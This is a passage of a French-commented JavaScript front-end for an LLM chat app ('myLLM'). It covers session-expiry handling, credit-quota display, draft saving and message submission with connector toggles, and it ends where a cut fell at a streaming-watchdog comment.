/* =========================================================
   myLLM — Chat JS
   ========================================================= */

const csrfToken  = document.querySelector('meta[name="csrf-token"]')?.content || '';

const convId     = () => document.getElementById('convId').value;
const llmSelect  = document.getElementById('llmSelect');
const profileSel = document.getElementById('profileSelect');
const msgInput   = document.getElementById('msgInput');
const sendBtn    = document.getElementById('sendBtn');
const stopBtn    = document.getElementById('stopBtn');
const chatMsgs   = document.getElementById('chatMessages');
const fileInput  = document.getElementById('fileInput');
const fileChips  = document.getElementById('fileChips');
const inputBox   = document.getElementById('inputBox');
let pendingFiles = []; // [{token, name, type, previewUrl}]

// ---- Streams en arrière-plan ----
// convId (string) → { rawText, done, finalQuotaStatus, finalConversationCredits, el (DOM element), controller (AbortController) }
const activeStreams = new Map();
let visibleConvId = document.getElementById('convId')?.value || null;
const LOGIN_PATH = '/auth/login';

// Streams "courts" qui ne backgroundent pas (regenerate, imagine, generate-html, generate-video).
// On les garde séparés d'activeStreams pour ne pas perturber switchConversation.
const inlineControllers = new Map(); // convId → { controller, done }

// Générations asynchrones en cours (file de jobs côté serveur) — survivent au
// changement de conversation ET au rechargement de page, contrairement aux deux
// maps ci-dessus. jobId (string) → état d'affichage (cf. attachJob).
const activeJobs = new Map();

// Conversation vocale : vrai tant qu'une boucle « écouter → envoyer → lire »
// tourne (cf. l'IIFE « Conversation vocale » en fin de fichier). Lu par
// submitForm pour marquer le message `voice_mode=1` — le serveur ajoute alors
// la consigne de réponse orale au system prompt.
let voiceModeActive = false;

/**
 * Hauteur réservée en haut d'écran (barre d'état / encoche) — 0 en navigateur.
 * Implémentation unique dans user-menu.js (chargé par toutes les pages) ; le
 * repli à 0 garde le chat fonctionnel si ce script venait à manquer.
 */
function safeAreaTop() {
    return typeof window.miaSafeAreaTop === 'function' ? window.miaSafeAreaTop() : 0;
}

/** Bascule l'UI envoi ↔ stop selon qu'un stream est actif sur la conv visible. */
function refreshSendStopUi() {
    if (!stopBtn) return;
    const cidStr = visibleConvId ? String(visibleConvId) : null;
    const bgState     = cidStr ? activeStreams.get(cidStr) : null;
    const inlineState = cidStr ? inlineControllers.get(cidStr) : null;
    let jobRunning = false;
    if (cidStr) {
        activeJobs.forEach((jobState) => {
            // Un job « passif » (suivi Gamma) n'occupe pas la conversation : le
            // composer reste utilisable, et son arrêt passe par le tiroir.
            if ((JOB_TYPES[jobState.type] || {}).passive === true) return;
            if (!jobState.done && String(jobState.convId) === cidStr) jobRunning = true;
        });
    }
    const streaming = !!(bgState && !bgState.done) || !!(inlineState && !inlineState.done) || jobRunning;
    stopBtn.style.display = streaming ? '' : 'none';
    sendBtn.style.display = streaming ? 'none' : '';
}

/** Stoppe le stream actif (background ou inline) sur la conv visible, s'il existe. */
function abortVisibleStream() {
    if (!visibleConvId) return;
    const cidStr = String(visibleConvId);
    const bgState = activeStreams.get(cidStr);
    if (bgState && !bgState.done) {
        bgState.aborted = true;
        // Génération asynchrone : fermer l'EventSource n'arrêterait rien, la
        // demande d'arrêt passe par le serveur.
        if (bgState.jobId) {
            fetch(`/jobs/${bgState.jobId}/cancel`, {
                method: 'POST',
                headers: { 'X-CSRF-Token': csrfToken },
            }).catch(() => {});
            return;
        }
        if (bgState.controller) {
            try { bgState.controller.abort(); } catch (_) {}
            return;
        }
    }
    const inlineState = inlineControllers.get(cidStr);
    if (inlineState && !inlineState.done && inlineState.controller) {
        inlineState.aborted = true;
        try { inlineState.controller.abort(); } catch (_) {}
        return;
    }
    // Génération asynchrone : le flux n'est qu'un spectateur. Fermer
    // l'EventSource n'arrêterait rien — l'arrêt se demande au serveur.
    for (const jobState of activeJobs.values()) {
        if (!jobState.done && String(jobState.convId) === cidStr) {
            fetch(`/jobs/${jobState.id}/cancel`, {
                method: 'POST',
                headers: { 'X-CSRF-Token': csrfToken },
            }).catch(() => {});
            return;
        }
    }
}

function toPath(url) {
    try {
        return new URL(String(url || ''), window.location.origin).pathname;
    } catch (_err) {
        return '';
    }
}

function isLoginPath(url) {
    return toPath(url) === LOGIN_PATH;
}

/**
 * Filtre l'URL de redirection : ne tolère que les chemins pointant vers
 * /auth/login (avec query string optionnelle). Tout le reste retombe sur
 * LOGIN_PATH par défaut, pour éviter d'envoyer l'utilisateur sur un endpoint
 * AJAX qui afficherait un JSON brut (ex. /auth/session-status renvoyé par
 * res.url quand la session expire pendant un check de session).
 */
function safeLoginUrl(url) {
    if (typeof url !== 'string' || url === '') return LOGIN_PATH;
    try {
        const u = new URL(url, window.location.origin);
        if (u.pathname === LOGIN_PATH) {
            return u.pathname + (u.search || '');
        }
    } catch (_) {
        /* URL invalide → fallback */
    }
    return LOGIN_PATH;
}

function redirectToLogin(loginUrl = LOGIN_PATH) {
    window.location.href = safeLoginUrl(loginUrl);
}

/**
 * Affiche une modale explicite « Session expirée » avec un bouton pour
 * retourner à la connexion. Idempotente : si la modale est déjà visible,
 * la fonction ne fait rien. Remplace l'ancien message d'erreur générique
 * qui bloquait l'utilisateur jusqu'à fermeture du navigateur.
 */
let __sessionExpiredShown = false;
function showSessionExpiredModal(loginUrl = LOGIN_PATH) {
    if (__sessionExpiredShown) return;
    __sessionExpiredShown = true;

    // Photographie le brouillon AVANT de neutraliser la saisie : le texte en
    // cours de frappe survit à la redirection (restauré par
    // restoreComposerDraft au retour). C'est LA raison d'être de la modale :
    // ne plus perdre un prompt tapé sur une session morte.
    let brouillonConserve = false;
    try { brouillonConserve = saveComposerDraft(); } catch (_e) {}

    // Désactive toute saisie en cours pour éviter que l'utilisateur tente
    // de renvoyer des requêtes qui échoueraient silencieusement.
    document.querySelectorAll('input, textarea, button, select').forEach(el => { el.disabled = true; });

    const REDIRECT_DELAY_S = 8;
    const overlay = document.createElement('div');
    overlay.className = 'session-expired-modal';
    overlay.setAttribute('role', 'alertdialog');
    overlay.setAttribute('aria-modal', 'true');
    overlay.innerHTML = `
        <div class="session-expired-box">
            <div class="session-expired-icon" aria-hidden="true">
                <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
            </div>
            <h2>Session expirée</h2>
            <p>Votre session a expiré ou vous n'êtes plus connecté. Reconnectez-vous pour reprendre là où vous en étiez.</p>
            ${brouillonConserve ? '<p class="session-expired-draft">✓ Votre message en cours d\'écriture est conservé : vous le retrouverez dans le champ de saisie après reconnexion.</p>' : ''}
            <button type="button" class="btn-primary session-expired-btn">
                <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4"/><polyline points="10 17 15 12 10 7"/><line x1="15" y1="12" x2="3" y2="12"/></svg>
                Se reconnecter
            </button>
            <div class="session-expired-countdown">Redirection automatique dans <span class="session-expired-count">${REDIRECT_DELAY_S}</span>&nbsp;s</div>
        </div>
    `;
    document.body.appendChild(overlay);

    const goLogin = () => redirectToLogin(loginUrl || LOGIN_PATH);

    // Compte à rebours visible, puis redirect auto si l'utilisateur ne clique pas.
    const countEl = overlay.querySelector('.session-expired-count');
    let remaining = REDIRECT_DELAY_S;
    const timer = setInterval(() => {
        remaining -= 1;
        if (countEl) countEl.textContent = String(Math.max(0, remaining));
        if (remaining <= 0) {
            clearInterval(timer);
            goLogin();
        }
    }, 1000);

    overlay.querySelector('.session-expired-btn').addEventListener('click', () => {
        clearInterval(timer);
        goLogin();
    });
}

function isExpiredSessionResponse(response) {
    if (!response) return false;
    if (response.status === 401) return true;
    if (response.redirected && isLoginPath(response.url)) return true;
    return isLoginPath(response.url);
}

/**
 * True si une chaîne (ligne SSE non parseable, réponse HTML, etc.) ressemble
 * à un redirect vers la page de login ou à une page HTML non authentifiée.
 * Permet de détecter une session qui expire AU MILIEU d'un flux SSE.
 */
function looksLikeAuthFailure(text) {
    if (typeof text !== 'string' || text === '') return false;
    const sample = text.slice(0, 400).toLowerCase();
    return sample.includes('/auth/login')
        || sample.includes('"session_expired"')
        || sample.includes('"authenticated":false')
        || (sample.includes('<html') && sample.includes('login'));
}

async function ensureSessionActive() {
    try {
        const res = await fetch('/auth/session-status', {
            method: 'GET',
            headers: {
                'Accept': 'application/json',
                'X-Requested-With': 'XMLHttpRequest',
            },
            cache: 'no-store',
            redirect: 'follow',
        });

        if (isExpiredSessionResponse(res)) {
            showSessionExpiredModal(res.url || LOGIN_PATH);
            return false;
        }

        const data = await res.json().catch(() => null);
        if (!res.ok || !data || data.authenticated !== true) {
            showSessionExpiredModal(data?.login_url || LOGIN_PATH);
            return false;
        }

        return true;
    } catch (_err) {
        showSessionExpiredModal(LOGIN_PATH);
        return false;
    }
}

async function fetchWithSessionGuard(input, init) {
    let res;
    try {
        res = await fetch(input, init);
    } catch (err) {
        // Erreur réseau brute : on laisse l'appelant décider (retry, message, etc.)
        throw err;
    }
    if (isExpiredSessionResponse(res)) {
        // Tente de lire le login_url depuis le JSON 401 renvoyé par AuthMiddleware.
        let loginUrl = res.url || LOGIN_PATH;
        try {
            const cloned = res.clone();
            const data = await cloned.json();
            if (data && typeof data.login_url === 'string') {
                loginUrl = data.login_url;
            }
        } catch (_) {
            /* réponse non-JSON : on garde l'URL par défaut */
        }
        showSessionExpiredModal(loginUrl);
        throw new Error('SESSION_EXPIRED');
    }
    return res;
}

// ---- Veille de session ----
// Détecte une session morte AVANT que l'utilisateur ne s'en aperçoive en
// tapant : vérification immédiate au retour sur l'onglet (LE moment critique —
// page ouverte depuis des heures, sessions purgées par un redéploiement) et
// toutes les 60 s onglet visible. Sur session expirée → modale explicative
// (brouillon photographié) puis page de connexion.
// Volontairement DISTINCT d'ensureSessionActive : ici, seule une réponse
// 401 / authenticated:false fait foi — une coupure réseau passagère ou un 5xx
// ne doit JAMAIS éjecter l'utilisateur pendant qu'il travaille.
(function initSessionWatchdog() {
    const CHECK_MS = 60000;
    let enCours = false;

    async function verifier() {
        if (__sessionExpiredShown || enCours || document.hidden) return;
        enCours = true;
        try {
            const res = await fetch('/auth/session-status', {
                headers: { 'Accept': 'application/json', 'X-Requested-With': 'XMLHttpRequest' },
                cache: 'no-store',
            });
            if (res.status === 401 || res.ok) {
                const data = await res.json().catch(() => null);
                if ((res.status === 401) || (data && data.authenticated === false)) {
                    showSessionExpiredModal(data?.login_url || LOGIN_PATH);
                }
            }
            // Autres statuts (5xx, proxy en vrac) : on ne conclut rien.
        } catch (_e) {
            /* réseau : silencieux — le prochain battement retentera */
        } finally {
            enCours = false;
        }
    }

    setInterval(verifier, CHECK_MS);
    document.addEventListener('visibilitychange', () => { if (!document.hidden) verifier(); });
})();

// Deux raisons de refus (CreditQuota::status → reason) : quota PERSONNEL ou
// budget IA de l'ORGANISATION. La modale porte un bloc par raison.
function showQuotaModal(reason) {
    const modal = document.getElementById('quotaModal');
    if (!modal) return;
    const wanted = reason === 'budget' ? 'budget' : 'quota';
    modal.querySelectorAll('[data-quota-reason]').forEach(block => {
        block.hidden = block.dataset.quotaReason !== wanted;
    });
    modal.style.display = 'flex';
}

function formatInt(value) {
    return Number(value || 0).toLocaleString('fr-FR');
}

function applyConversationCreditsTotal(totalCredits) {
    const valueEl = document.getElementById('conversationCreditsValue');
    if (!valueEl) return;
    const safeTotal = Math.max(0, Math.round(Number(totalCredits || 0)));
    valueEl.textContent = formatInt(safeTotal);
    // Note masquée tant que la conversation n'a rien consommé (accueil épuré)
    const box = document.getElementById('conversationCreditsBox');
    if (box) box.style.display = safeTotal > 0 ? '' : 'none';
}

function costBadgeFromStars(stars) {
    const n = Math.max(0, Math.min(5, Number(stars || 0)));
    return n > 0 ? '€'.repeat(n) : '—';
}

function updateTopToolbarMeta({ modelLabel = null, modelCost = null, historyCount = null, modelLogo = null, modelCostTitle = null } = {}) {
    const modelEl = document.getElementById('topActiveModelLabel');
    const costEl  = document.getElementById('topActiveModelCost');
    const histEl  = document.getElementById('topHistoryCount');
    const logoEl  = document.getElementById('topActiveModelLogo');

    if (modelEl) {
        if (modelLabel !== null) {
            modelEl.textContent = modelLabel || '';
        } else {
            const selected = document.querySelector('#llmPickerList .llm-picker-item.active');
            if (selected?.dataset?.label) {
                modelEl.textContent = selected.dataset.label;
            }
        }
    }

    if (costEl) {
        const selected = document.querySelector('#llmPickerList .llm-picker-item.active');
        costEl.textContent = costBadgeFromStars(modelCost !== null ? modelCost : (selected?.dataset?.cost || 0));
        // Le coût en clair (≈ crédits par réponse), posé par le serveur sur
        // chaque modèle du sélecteur : mêmes chiffres partout.
        const title = modelCostTitle !== null ? modelCostTitle : (selected?.dataset?.costTitle || '');
        if (title) costEl.title = title;
    }

    if (logoEl) {
        if (modelLogo !== null) {
            logoEl.src = modelLogo || (window.LOGO_URL || '/assets/img/logo.png');
        } else {
            const selected = document.querySelector('#llmPickerList .llm-picker-item.active');
            logoEl.src = selected?.dataset?.logo || (window.LOGO_URL || '/assets/img/logo.png');
        }
    }

    if (histEl) {
        if (historyCount !== null) {
            histEl.textContent = String(Math.max(0, Number(historyCount || 0)));
        } else {
            const count = document.querySelectorAll('#chatMessages .message').length;
            histEl.textContent = String(count);
        }
    }
}

function applyQuotaStatus(status) {
    if (!status || typeof status !== 'object') return;

    const remainingEl = document.getElementById('creditRemainingLabel');
    const breakdownEl = document.getElementById('creditBreakdownLabel');
    const quotaBar = document.getElementById('creditQuotaBar');

    // Budget IA de l'organisation atteint : la mention remplace les crédits
    // restants (aucun montant côté utilisateur), la barre du quota reste telle quelle.
    if (status.reason === 'budget') {
        if (remainingEl) {
            remainingEl.textContent = t('Service IA suspendu');
            remainingEl.style.color = '#ef4444';
        }
        if (breakdownEl) breakdownEl.textContent = '';
        if (quotaBar) quotaBar.style.background = '#ef4444';
        return;
    }

    const hasQuota = status.quota_max !== null;
    const used = Number(status.used || 0);
    const quotaMax = hasQuota ? Number(status.quota_max || 0) : 0;
    const remaining = hasQuota ? Math.max(0, quotaMax - used) : null;
    const pct = hasQuota
        ? (quotaMax > 0
            ? Math.max(0, Math.min(100, Number(status.percent || Math.round((used / quotaMax) * 100))))
            : 100)
        : 0;

    if (remainingEl) {
        if (!hasQuota) {
            remainingEl.textContent = t('Illimité');
            remainingEl.style.color = 'var(--text-muted)';
        } else if (remaining <= 0) {
            remainingEl.textContent = t('Quota épuisé');
            remainingEl.style.color = '#ef4444';
        } else {
            remainingEl.textContent = t('{n} crédits restants', { n: formatInt(remaining) });
            remainingEl.style.color = pct >= 70 ? '#f59e0b' : 'var(--text-muted)';
        }
    }

    if (breakdownEl) {
        breakdownEl.textContent = (hasQuota && remaining > 0) ? ` / ${formatInt(quotaMax)}` : '';
    }

    if (quotaBar) {
        quotaBar.style.width = `${Math.max(0, 100 - pct)}%`;
        quotaBar.style.background = pct >= 90 ? '#ef4444' : (pct >= 70 ? '#f59e0b' : 'var(--accent)');
    }

}

function handleQuotaExceededPayload(payload) {
    if (!payload || payload.quota_exceeded !== true) return false;
    applyQuotaStatus(payload.quota_status || null);
    showQuotaModal(payload.quota_status ? payload.quota_status.reason : null);
    return true;
}

// Placeholder compact sur mobile (évite un placeholder tronqué — et le
// glisser-déposer de fichiers qu'il mentionne n'existe pas au doigt).
if (msgInput && window.matchMedia('(max-width: 768px)').matches) {
    msgInput.placeholder = t('Envoyer un message…');
}

// ---- Brouillon persistant du composer (localStorage) ----
// Un prompt tapé ne doit JAMAIS être perdu : session expirée pendant la
// frappe, rechargement, fermeture d'onglet. Sauvegarde debouncée par
// conversation, restauration à l'ouverture et au changement de conversation,
// purge quand le serveur a ACCEPTÉ le message (job créé) — pas avant : un
// envoi qui échoue doit laisser le brouillon en place.
// Clé par utilisateur (navigateur partagé = pas de fuite), même patron que
// connectorPrefs/toolPrefs.
const DRAFT_STORE_KEY   = 'composerDrafts:' + (window.CURRENT_USER_ID ?? 'anon');
const DRAFT_MAX_LEN     = 24000; // borne dure par brouillon
const DRAFT_MAX_ENTRIES = 20;    // conversations les plus récentes seulement

function draftConvKey() {
    const cid = document.getElementById('convId')?.value || '';
    return cid !== '' ? String(cid) : 'draft';
}

function readDraftStore() {
    try {
        const data = JSON.parse(localStorage.getItem(DRAFT_STORE_KEY) || '{}');
        return (data && typeof data === 'object' && !Array.isArray(data)) ? data : {};
    } catch (_e) { return {}; }
}

function writeDraftStore(store) {
    try {
        const keys = Object.keys(store);
        if (keys.length > DRAFT_MAX_ENTRIES) {
            keys.sort((a, b) => (store[a]?.ts || 0) - (store[b]?.ts || 0))
                .slice(0, keys.length - DRAFT_MAX_ENTRIES)
                .forEach(k => delete store[k]);
        }
        localStorage.setItem(DRAFT_STORE_KEY, JSON.stringify(store));
    } catch (_e) { /* navigation privée / quota plein : best-effort, jamais d'erreur */ }
}

/** Écrit `text` sous la conversation courante. Texte vide = brouillon effacé. */
function commitComposerDraft(text) {
    clearTimeout(draftSaveTimer);
    const store = readDraftStore();
    const key = draftConvKey();
    if (typeof text !== 'string' || text.trim() === '') {
        if (store[key] === undefined) { return false; }
        delete store[key];
        writeDraftStore(store);
        return false;
    }
    store[key] = { text: text.slice(0, DRAFT_MAX_LEN), ts: Date.now() };
    writeDraftStore(store);
    return true;
}

/** Photographie le champ de saisie. Renvoie true si un brouillon est conservé. */
function saveComposerDraft() {
    return msgInput ? commitComposerDraft(msgInput.value) : false;
}

/** Purge après acceptation serveur — la clé conv ET la clé « draft » : un envoi
 *  depuis l'accueil vient de créer la conversation, c'est le même texte. */
function clearComposerDraft() {
    const store = readDraftStore();
    const key = draftConvKey();
    if (store[key] === undefined && store.draft === undefined) return;
    delete store[key];
    delete store.draft;
    writeDraftStore(store);
}

/** Restaure le brouillon de la conversation affichée — champ vide seulement,
 *  une saisie en cours ne s'écrase pas. */
function restoreComposerDraft() {
    if (!msgInput || msgInput.value.trim() !== '') return;
    const entry = readDraftStore()[draftConvKey()];
    if (!entry || typeof entry.text !== 'string' || entry.text.trim() === '') return;
    msgInput.value = entry.text;
    // Rejoue l'évènement : auto-resize + activation du bouton Envoyer.
    msgInput.dispatchEvent(new Event('input', { bubbles: true }));
}

let draftSaveTimer = null;
msgInput?.addEventListener('input', () => {
    clearTimeout(draftSaveTimer);
    draftSaveTimer = setTimeout(saveComposerDraft, 400);
});
// Départ de page : le débounce peut avoir 400 ms de retard sur la frappe.
window.addEventListener('pagehide', saveComposerDraft);
restoreComposerDraft();

// ---- Auto-resize textarea ----
// Plafond : 200 px sur ordinateur ; sur téléphone, celui de la feuille de
// style (~40 % de l'écran) — la zone de saisie y grandit davantage.
const COMPOSER_MOBILE = window.matchMedia('(max-width: 768px)');
function composerMaxHeight() {
    if (!COMPOSER_MOBILE.matches) return 200;
    const max = parseFloat(getComputedStyle(msgInput).maxHeight);
    return Number.isFinite(max) && max > 0 ? max : 200;
}
msgInput?.addEventListener('input', () => {
    msgInput.style.height = 'auto';
    msgInput.style.height = Math.min(msgInput.scrollHeight, composerMaxHeight()) + 'px';
    sendBtn.disabled = msgInput.value.trim() === '' && pendingFiles.length === 0;
});

// Envoi au clavier, selon la touche choisie dans Réglages → Affichage
// (data-send-key sur #msgInput, posé par le serveur) :
//   enter      Entrée envoie, Maj+Entrée va à la ligne (défaut) ;
//   mod_enter  Ctrl+Entrée ou ⌘+Entrée envoie, Entrée va à la ligne.
// Jamais pendant une composition de saisie (japonais, chinois, accents morts) :
// l'Entrée qui VALIDE un caractère composé n'est pas un envoi.
function isSendKeystroke(e, mode) {
    if (e.key !== 'Enter' || e.isComposing || e.keyCode === 229) return false;
    if (mode === 'mod_enter') return !!(e.ctrlKey || e.metaKey) && !e.shiftKey;
    return !e.shiftKey;
}

msgInput?.addEventListener('keydown', e => {
    if (isSendKeystroke(e, msgInput.dataset.sendKey || 'enter')) {
        e.preventDefault();
        if (!sendBtn.disabled) submitForm();
    }
});

// Le bouton Envoyer annonce le raccourci en vigueur (⌘ sur Mac).
(function labelSendShortcut() {
    if (!msgInput || !sendBtn) return;
    const mac = /Mac|iPhone|iPad/.test(navigator.platform || navigator.userAgent || '');
    if (msgInput.dataset.sendKey !== 'mod_enter') sendBtn.title = t('Envoyer (Entrée)');
    else sendBtn.title = mac ? t('Envoyer (⌘ + Entrée)') : t('Envoyer (Ctrl + Entrée)');
})();

// ---- Envoi du formulaire ----
document.getElementById('chatForm')?.addEventListener('submit', e => {
    e.preventDefault();
    submitForm();
});

// ---- Stop : abandon de la génération courante (chat normal ou regenerate/outils) ----
stopBtn?.addEventListener('click', abortVisibleStream);

// ---- Créer une conversation (helper partagé) ----
async function createConversation() {
    const fd = new FormData();
    const selectedProfileId = profileSel?.value || '';
    fd.append('llm', llmSelect?.value || 'openai');
    fd.append('profile_id', selectedProfileId);
    if (!selectedProfileId) {
        fd.append('start_mode', 'llm_only');
    }
    // Bases cochées avant l'existence de la conversation : elles voyagent dans
    // CE POST. Un appel séparé après coup courrait contre le worker, qui peut
    // lire la table dès l'enfilage du job du premier message.
    window.kbDraftAppend?.(fd);
    let res;
    try {
        res = await fetchWithSessionGuard('/chat/new', { method: 'POST', headers: { 'X-CSRF-Token': csrfToken }, body: fd, redirect: 'follow' });
    } catch (err) {
        if (err instanceof Error && err.message === 'SESSION_EXPIRED') return false;
        throw err;
    }
    const match = res.url.match(/\/chat\/(\d+)/);
    if (match) {
        document.getElementById('convId').value = match[1];
        visibleConvId = match[1];
        history.replaceState({ convId: match[1] }, '', `/chat/${match[1]}`);
        document.getElementById('chatToolbar')?.style.removeProperty('display');
        // L'outil engagé avant l'existence de la conversation la suit : sans
        // ce report, le choix resterait attaché au brouillon et serait perdu
        // dès le premier message.
        window.carryToolChoiceToConversation?.();
        // Le serveur les a enregistrées : le brouillon a fait son office.
        window.kbDraftClear?.();
        addConvToSidebar(match[1], t('Nouvelle conversation'), llmSelect?.value || '');
        updateTopToolbarMeta({ historyCount: 0 });
        applyConversationCreditsTotal(0);
        return true;
    }
    window.location.href = res.url || '/';
    return false;
}

/**
 * Envoi du composer. Rend `true` quand une réponse de chat est en route
 * (job attaché), `'tool'` quand le message est parti vers un outil de
 * génération (rien à lire pour la conversation vocale), `false` sinon
 * (rien à envoyer, refus du serveur, annulation) — la conversation vocale
 * s'en sert pour savoir si elle attend une réponse ou se remet à écouter.
 *
 * `override.text` : message envoyé À LA PLACE du champ de saisie — un choix
 * touché sous une réponse (sendChoiceAnswer). Le brouillon et les fichiers en
 * attente restent alors dans le composer : ils n'ont rien à voir avec le choix.
 */
async function submitForm(override = null) {
    const fromChoice = !!override && typeof override.text === 'string';
    const text = fromChoice ? override.text.trim() : msgInput.value.trim();
    if (!text && (fromChoice || pendingFiles.length === 0)) return false;
    // Photographie synchrone AVANT tout : le champ est vidé plus bas, et le
    // débounce de 400 ms pourrait alors écraser le brouillon avec du vide
    // pendant que l'envoi échoue. Purgé seulement à l'acceptation serveur.
    if (!fromChoice) commitComposerDraft(text);
    if (!await ensureSessionActive()) return false;

    // Mode outil de génération (image, HTML, carte, présentation ou vidéo).
    // Un seul état : l'outil engagé au menu « + » — que l'utilisateur l'ait
    // choisi lui-même ou approuvé depuis la bannière de suggestion, qui arme
    // le picker et rien d'autre. Il RESTE engagé après l'envoi (on affine sa
    // production message après message) jusqu'à ce qu'il soit éteint.
    const activeTool = selectedTool;
    if (activeTool && text) {
        if (activeTool.type === 'image') await submitImagine(text, activeTool.id);
        else if (activeTool.type === 'map') await generateMap(text, activeTool.id);
        // La présentation ne génère rien tout de suite : elle ouvre son volet
        // sur les options, et l'utilisateur valide un plan avant construction.
        else if (activeTool.type === 'presentation') {
            // Jamais d'appel optionnel silencieux ici : si deck.js n'a pas pu
            // s'initialiser, l'envoi doit le DIRE plutôt que de ne rien faire.
            if (typeof window.Deck?.start !== 'function') {
                showToast(t('Outil présentation indisponible — rechargez la page.'), 'error');
                return false;
            }
            window.Deck.start(text, activeTool);
        }
        else if (activeTool.type === 'html') await generateHtml(text, activeTool.id);
        else if (activeTool.type === 'html_illustrated') {
            // Itération : une page existe déjà dans la conversation — le job
            // repart d'elle et conserve ses images ; re-demander outil image
            // et style à chaque ajustement serait du bruit.
            if (conversationHasGeneratedHtml()) {
                await generateHtml(text, activeTool.id);
            } else {
                const pick = await promptIllustratedImageTool(activeTool);
                if (!pick) return false; // annulé — outil engagé et texte conservés
                await generateHtml(text, activeTool.id, pick.imageToolId, pick.style);
            }
        }
        else if (activeTool.type === 'video') {
            const videoSettings = await promptVideoSettings(activeTool);
            if (!videoSettings) return false; // annulé — outil engagé et texte conservés
            await generateVideo(text, activeTool.id, videoSettings);
        }
        window.ToolSuggest?.clearAfterSend?.();
        return 'tool';
    }
    // Envoi normal : une suggestion non approuvée est un refus implicite du
    // message courant (sans mémorisation session).
    window.ToolSuggest?.clearAfterSend?.();

    // Snapshot des fichiers avant clearFiles() — aucun pour un choix touché.
    const snapshotFiles = fromChoice ? [] : [...pendingFiles];

    // Pas encore de conversation ? on en crée une
    if (!convId()) {
        if (!await createConversation()) return false;
    }

    const currentConvId = convId();

    // Affiche le message utilisateur
    appendMessage('user', text, snapshotFiles);
    if (!fromChoice) {
        msgInput.value = '';
        msgInput.style.height = 'auto';
        clearFiles();
    }
    sendBtn.disabled = true;

    // Placeholder assistant
    const assistantEl = appendMessage('assistant', '', [], true);

    const fd = new FormData();
    fd.append('message', text);
    fd.append('llm', llmSelect?.value || 'openai');
    fd.append('web_access', document.getElementById('webAccessToggle')?.checked ? '1' : '0');
    fd.append('drive_access', document.getElementById('driveAccessToggle')?.checked ? '1' : '0');
    fd.append('gmail_access', document.getElementById('gmailAccessToggle')?.checked ? '1' : '0');
    fd.append('outlook_access', document.getElementById('outlookAccessToggle')?.checked ? '1' : '0');
    fd.append('calendar_access', document.getElementById('calendarAccessToggle')?.checked ? '1' : '0');
    fd.append('mscalendar_access', document.getElementById('mscalendarAccessToggle')?.checked ? '1' : '0');
    fd.append('tasks_access', document.getElementById('tasksAccessToggle')?.checked ? '1' : '0');
    fd.append('mstodo_access', document.getElementById('mstodoAccessToggle')?.checked ? '1' : '0');
    fd.append('teams_access', document.getElementById('teamsAccessToggle')?.checked ? '1' : '0');
    // Message dicté en conversation vocale : la réponse sera lue à voix haute,
    // le serveur demande au modèle une réponse orale (courte, sans mise en forme).
    fd.append('voice_mode', voiceModeActive ? '1' : '0');
    fd.append('slack_access', document.getElementById('slackAccessToggle')?.checked ? '1' : '0');
    fd.append('connectors_auto', document.getElementById('connectorsAutoToggle')?.checked ? '1' : '0');
    fd.append('tz', clientTimeZone());
    snapshotFiles.forEach(f => fd.append('file_tokens[]', f.token));

    // La requête n'attend PLUS la réponse du modèle : elle enfile un job et
    // rend la main. La génération vit côté serveur — quitter la page, changer
    // de conversation ou recharger ne l'interrompt plus.
    let response;
    try {
        response = await fetchWithSessionGuard(`/chat/${currentConvId}/send`, {
            method: 'POST', headers: { 'X-CSRF-Token': csrfToken }, body: fd,
        });
    } catch (err) {
        if (err instanceof Error && err.message === 'SESSION_EXPIRED') {
            sendBtn.disabled = msgInput.value.trim() === '' && pendingFiles.length === 0;
            return false;
        }
        renderInlineError(assistantEl, {
            kind: 'network',
            title: t('Connexion impossible'),
            message: t('Impossible de contacter le serveur. Vérifiez votre connexion puis réessayez.'),
        });
        sendBtn.disabled = msgInput.value.trim() === '' && pendingFiles.length === 0;
        return false;
    }

    const payload = await response.json().catch(() => ({}));
    if (!response.ok) {
        if (response.status === 429 && handleQuotaExceededPayload(payload)) {
            assistantEl.closest('.message')?.remove();
        } else {
            renderInlineError(assistantEl, {
                kind: response.status >= 500 ? 'server' : 'bad_request',
                title: response.status >= 500 ? t('Erreur du serveur') : t('Demande refusée par le serveur'),
                message: payload.error || t('Le serveur a répondu avec une erreur (HTTP {code}). Réessayez ou reformulez votre demande.', { code: response.status }),
            });
        }
        sendBtn.disabled = msgInput.value.trim() === '' && pendingFiles.length === 0;
        return false;
    }
    if (!payload.job_id) {
        renderInlineError(assistantEl, {
            kind: 'server',
            title: t('Génération impossible'),
            message: t('La génération n\'a pas pu être lancée. Réessayez.'),
        });
        sendBtn.disabled = msgInput.value.trim() === '' && pendingFiles.length === 0;
        return false;
    }

    // Message accepté (job créé, message user persisté côté serveur) : le
    // brouillon a rempli son office — sauf pour un choix touché, qui ne l'a
    // pas envoyé.
    if (!fromChoice) clearComposerDraft();
    attachChatJob(payload.job_id, currentConvId, assistantEl);
    return true;
}

/**
 * Fin d'un tour de chat asynchrone (réponse complète, interrompue ou perdue) :
 * évènement DOM pour qui veut enchaîner — la conversation vocale, qui lit la
 * réponse pendant qu'elle s'écrit, y apprend comment elle s'est terminée.
 * Émis une seule fois par tour, depuis les deux clôtures (payload `done`,
 * fermeture du flux), avec la génération concernée (`jobId`) : une réponse
 * arrêtée qui se clôt en retard ne passe jamais pour celle du tour suivant.
 */
function notifyChatTurnEnded(cidStr, detail) {
    document.dispatchEvent(new CustomEvent('mia:chat-turn-ended', {
        detail: Object.assign({ convId: String(cidStr) }, detail),
    }));
}

/**
 * Titre de l'encadré d'erreur d'un tour (« Crédit épuisé chez … », « Service
 * surchargé »), ou '' quand le tour n'a pas échoué sur une erreur de modèle.
 * La conversation vocale le reprend dans son message de fin : qui écoute sans
 * regarder l'écran n'apprend rien d'un « la réponse est en erreur ».
 */
function turnErrorTitle(state) {
    const title = state && state.errorPayload ? state.errorPayload.title : '';
    return typeof title === 'string' ? title.trim() : '';
}

// =========================================================
// WATCHDOG DE STREAMING — vérifie régulièrement que l'API répond
// =========================================================
// Pendant la génération, un check périodique surveille le silence du serveur :
//  - avant le 1er token : le texte de phase est mis à jour pour expliquer
//    l'attente, puis une nouvelle tentative est lancée automatiquement ;
